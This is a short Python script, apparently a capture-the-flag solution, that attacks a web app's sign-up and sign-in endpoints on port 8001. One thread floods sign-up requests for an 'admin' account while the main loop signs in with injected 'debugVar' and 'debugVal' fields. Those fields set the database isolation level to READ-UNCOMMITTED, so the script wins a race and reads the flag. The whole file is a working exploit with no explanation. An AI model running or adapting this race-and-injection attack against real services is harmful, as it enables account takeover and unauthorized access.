import threading
import argparse
import requests
import time

class Writer(threading.Thread):
    """Thread class with a stop() method. The thread itself has to check
    regularly for the stopped() condition."""

    def __init__(self, *args, **kwargs):
        super(Writer, self).__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

    def run(self):
        url = 'http://{}:8001'.format(self._Thread__args[0])

        name = 'admin'
        password = 'lol'

        while self.stopped() != True:
            requests.post(url + '/signUp', data={'inputName': name,
                'inputPassword': password}).text

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='host', type=str)

    args = parser.parse_args()

    url = 'http://{}:8001'.format(args.host)

    thread = Writer(args=(args.host,))
    thread.start()

    name = 'admin'
    password = 'lol'

    while True:
        try:
            text = requests.post(url + '/signIn', data={'inputName': name,
                'inputPassword': password, 'debugVar': 'transaction_isolation',
                'debugVal': 'READ-UNCOMMITTED'}).text
            if 'Flag' in text:
                print(text)
                break
        except KeyboardInterrupt:
            print('Stopping')
            break
        except:
            pass

    thread.stop()
    thread.join()

if __name__ == "__main__":
    main()
